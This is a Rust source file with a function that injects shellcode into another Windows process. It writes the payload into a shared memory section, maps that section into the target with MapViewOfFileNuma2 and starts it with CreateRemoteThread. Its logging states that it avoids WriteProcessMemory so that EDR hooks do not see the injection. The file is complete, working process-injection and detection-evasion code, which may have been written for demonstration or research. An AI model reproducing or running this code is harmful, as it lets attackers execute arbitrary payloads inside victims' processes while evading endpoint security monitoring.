use crate::injection::InjectionResult;
use crate::log::LogSink;

#[cfg(windows)]
pub fn live_inject(
    pid: u32,
    shellcode: &[u8],
    log: &LogSink,
) -> Result<InjectionResult, String> {
    use windows::Win32::Foundation::{CloseHandle, FALSE, INVALID_HANDLE_VALUE, WAIT_OBJECT_0};
    use windows::Win32::System::Memory::{
        CreateFileMappingW, MapViewOfFile, MapViewOfFileNuma2, UnmapViewOfFile,
        FILE_MAP_WRITE, PAGE_EXECUTE_READ, PAGE_EXECUTE_READWRITE,
    };
    use windows::Win32::System::Threading::{
        CreateRemoteThread, GetExitCodeThread, OpenProcess, WaitForSingleObject, INFINITE,
        LPTHREAD_START_ROUTINE, PROCESS_CREATE_THREAD, PROCESS_QUERY_INFORMATION,
        PROCESS_VM_OPERATION, PROCESS_VM_READ,
    };

    let size = shellcode.len();

    log.step("[1/6] CreateFileMappingW — anonymous shared section (PAGE_EXECUTE_READWRITE)");
    let section = unsafe {
        CreateFileMappingW(
            INVALID_HANDLE_VALUE,
            None,
            PAGE_EXECUTE_READWRITE,
            0,
            size as u32,
            None,
        )
    }
    .map_err(|e| format!("CreateFileMappingW failed: {e}"))?;
    log.info(format!("      section handle: {:?}", section));

    log.step("[2/6] MapViewOfFile — map section into local process (FILE_MAP_WRITE)");
    let local_view = unsafe { MapViewOfFile(section, FILE_MAP_WRITE, 0, 0, size) };
    if local_view.Value.is_null() {
        let _ = unsafe { CloseHandle(section) };
        return Err("MapViewOfFile returned NULL — local mapping failed".to_string());
    }
    log.info(format!(
        "      local view at {:#p} ({} bytes)",
        local_view.Value, size
    ));

    log.step(format!(
        "[3/6] memcpy — write {} bytes to local mapping (no WriteProcessMemory)",
        size
    ));
    unsafe {
        core::ptr::copy_nonoverlapping(shellcode.as_ptr(), local_view.Value as *mut u8, size);
    }
    log.info("      shellcode written to shared section via local mapping");

    unsafe {
        let _ = UnmapViewOfFile(local_view);
    }
    log.detail("      local view unmapped");

    log.step(format!(
        "[4/6] OpenProcess(PID {}) + MapViewOfFileNuma2 — map section into target (PAGE_EXECUTE_READ)",
        pid
    ));
    let process_access =
        PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_READ;
    let process = unsafe { OpenProcess(process_access, FALSE, pid) }.map_err(|e| {
        let _ = unsafe { CloseHandle(section) };
        format!("OpenProcess failed: {e} (check privileges — try from an elevated shell)")
    })?;

    let remote_view = unsafe {
        MapViewOfFileNuma2(
            section,
            process,
            0,
            None,
            size,
            0,
            PAGE_EXECUTE_READ.0,
            u32::MAX,
        )
    };
    let _ = unsafe { CloseHandle(section) };

    if remote_view.Value.is_null() {
        let _ = unsafe { CloseHandle(process) };
        return Err(
            "MapViewOfFileNuma2 returned NULL — remote mapping failed (Windows 10 1703+ required)"
                .to_string(),
        );
    }
    let remote_base = remote_view.Value;
    log.info(format!(
        "      remote view at {:#p} ({} bytes, PAGE_EXECUTE_READ)",
        remote_base, size
    ));
    log.warning("      WriteProcessMemory was NEVER called — EDR hooks on it see nothing");

    log.step(format!(
        "[5/6] CreateRemoteThread — start at remote address {:#p}",
        remote_base
    ));
    let start: LPTHREAD_START_ROUTINE = Some(unsafe {
        core::mem::transmute::<
            *mut core::ffi::c_void,
            unsafe extern "system" fn(*mut core::ffi::c_void) -> u32,
        >(remote_base)
    });
    let mut thread_id: u32 = 0;
    let thread = match unsafe {
        CreateRemoteThread(
            process,
            None,
            0,
            start,
            Some(remote_base as *const core::ffi::c_void),
            0,
            Some(&mut thread_id),
        )
    } {
        Ok(h) => h,
        Err(e) => {
            let _ = unsafe { CloseHandle(process) };
            return Err(format!("CreateRemoteThread failed: {e}"));
        }
    };
    log.info(format!("      remote thread started (TID {})", thread_id));

    log.step("[6/6] WaitForSingleObject — waiting for remote thread to finish");
    let wait = unsafe { WaitForSingleObject(thread, INFINITE) };
    if wait != WAIT_OBJECT_0 {
        let _ = unsafe { CloseHandle(thread) };
        let _ = unsafe { CloseHandle(process) };
        return Err(format!(
            "WaitForSingleObject returned {} (expected WAIT_OBJECT_0)",
            wait.0
        ));
    }
    let mut exit_code: u32 = 0;
    if let Err(e) = unsafe { GetExitCodeThread(thread, &mut exit_code) } {
        let _ = unsafe { CloseHandle(thread) };
        let _ = unsafe { CloseHandle(process) };
        return Err(format!("GetExitCodeThread failed: {e}"));
    }
    let _ = unsafe { CloseHandle(thread) };
    let _ = unsafe { CloseHandle(process) };

    if exit_code == 0xC0000005 {
        log.error(format!(
            "      remote thread CRASHED — exit code 0x{:X} (ACCESS_VIOLATION)",
            exit_code
        ));
        log.error("      the shellcode hit an invalid memory access");
    } else if exit_code >= 0xC0000000 {
        log.warning(format!(
            "      remote thread exited with NTSTATUS error 0x{:X}",
            exit_code
        ));
    } else {
        log.info(format!(
            "      remote thread exited with code {}",
            exit_code
        ));
    }
    log.info(format!(
        "      shellcode at remote address {:#p} ({} bytes)",
        remote_base, size
    ));
    Ok(InjectionResult {
        remote_base: remote_base as u64,
        size,
    })
}

#[cfg(not(windows))]
pub fn live_inject(
    _pid: u32,
    _shellcode: &[u8],
    _log: &LogSink,
) -> Result<InjectionResult, String> {
    Err("live injection requires Windows — this build is running on a non-Windows host".to_string())
}
